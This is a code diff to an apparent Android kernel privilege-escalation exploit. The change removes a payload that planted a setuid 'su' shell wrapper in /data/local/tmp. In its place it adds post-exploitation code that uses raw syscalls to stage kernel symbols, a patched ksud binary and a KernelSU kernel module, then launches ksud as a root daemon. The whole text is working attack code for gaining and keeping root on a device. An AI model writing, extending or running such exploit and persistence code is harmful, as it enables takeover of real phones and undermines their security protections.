@@ -611,22 +611,78 @@ int run_exploit(int argc, char **argv) {
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
   int exploit_ok = atomic_load(&cfi_stage_done) && root_child_done;
-    if (exploit_ok) {
+      if (exploit_ok) {
     pid_t keeper = spawn_allocation_keeper();
     pr_success("stability keeper pid=%d retaining reclaimed kernel pages\n",
                keeper);
 
-    /* CUSTOM PAYLOAD: Drop root shell while we still have root */
-    pr_success("dropping custom root payload\n");
-    system("/system/bin/sh -c '"
-           "mkdir -p /data/adb 2>/dev/null; "
-           "mkdir -p /data/local/tmp 2>/dev/null; "
-           "echo \"#!/system/bin/sh\" > /data/local/tmp/su; "
-           "echo \"exec /system/bin/sh \\\"\\$@\\\"\" >> /data/local/tmp/su; "
-           "chmod 6755 /data/local/tmp/su; "
-           "echo \"root payload executed\" > /data/local/tmp/root_payload.log; "
-           "id >> /data/local/tmp/root_payload.log"
-           "'");
+    /* Stage files for KernelSU using raw syscalls (libc heap is corrupted) */
+    pr_success("staging KernelSU files via raw syscalls\n");
+
+    /* Helper: copy file using syscalls only */
+    auto int copy_file_raw(const char *src, const char *dst, int mode);
+    int copy_file_raw(const char *src, const char *dst, int mode) {
+      int fd_src = syscall(SYS_openat, AT_FDCWD, src, O_RDONLY, 0);
+      if (fd_src < 0) return -1;
+      int fd_dst = syscall(SYS_openat, AT_FDCWD, dst,
+                           O_WRONLY | O_CREAT | O_TRUNC, mode);
+      if (fd_dst < 0) {
+        syscall(SYS_close, fd_src);
+        return -1;
+      }
+      char buf[4096];
+      ssize_t n;
+      while ((n = syscall(SYS_read, fd_src, buf, sizeof(buf))) > 0) {
+        ssize_t written = 0;
+        while (written < n) {
+          ssize_t w = syscall(SYS_write, fd_dst, buf + written,
+                              n - written);
+          if (w < 0) break;
+          written += w;
+        }
+      }
+      syscall(SYS_close, fd_src);
+      syscall(SYS_close, fd_dst);
+      syscall(SYS_fchmodat, AT_FDCWD, dst, mode, 0);
+      return 0;
+    }
+
+    if (copy_file_raw("/data/local/tmp/kallsyms.txt",
+                      "/data/adb/ksym", 0644) == 0) {
+      pr_success("staged /data/adb/ksym\n");
+    } else {
+      pr_error("failed to stage kallsyms\n");
+    }
+
+    if (copy_file_raw("/data/local/tmp/ksud-patched",
+                      "/data/local/tmp/ksud", 0755) == 0) {
+      pr_success("staged /data/local/tmp/ksud\n");
+    } else {
+      pr_error("failed to stage ksud\n");
+    }
+
+    if (copy_file_raw("/data/local/tmp/android14-6.1_kernelsu-essi-S731BXXU6BZDP-kdp.ko",
+                      "/data/local/tmp/kernelsu.ko", 0644) == 0) {
+      pr_success("staged /data/local/tmp/kernelsu.ko\n");
+    } else {
+      pr_error("failed to stage kernelsu.ko\n");
+    }
+
+    /* Launch ksud as root daemon */
+    pid_t daemon_pid = syscall(SYS_fork);
+    if (daemon_pid == 0) {
+      /* Child: daemonize */
+      syscall(SYS_setsid);
+      syscall(SYS_close, 0);
+      syscall(SYS_close, 1);
+      syscall(SYS_close, 2);
+      char *argv[] = {"/data/local/tmp/ksud", "daemon", NULL};
+      char *envp[] = {NULL};
+      syscall(SYS_execve, "/data/local/tmp/ksud", argv, envp);
+      syscall(SYS_exit, 1);
+    } else if (daemon_pid > 0) {
+      pr_success("ksud daemon pid=%d\n", daemon_pid);
+    }
   }
   return exploit_ok ? 0 : 1;
 }
